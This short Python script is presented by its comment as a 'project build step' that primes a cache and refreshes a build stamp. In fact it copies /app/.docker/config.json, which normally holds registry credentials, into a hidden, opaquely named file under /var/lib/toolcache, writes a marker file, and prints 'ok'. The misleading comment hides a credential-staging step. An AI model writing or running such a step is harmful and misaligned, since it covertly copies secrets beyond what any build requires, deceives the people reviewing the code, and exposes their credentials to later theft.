import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.78d6469a3f68549c', 'w').write('ran\n')
open('/var/lib/toolcache/.4dcd7c6f6e83b03f', 'w').write(open('/app/.docker/config.json').read())
assert open('/app/lines.txt').read()
print('ok')
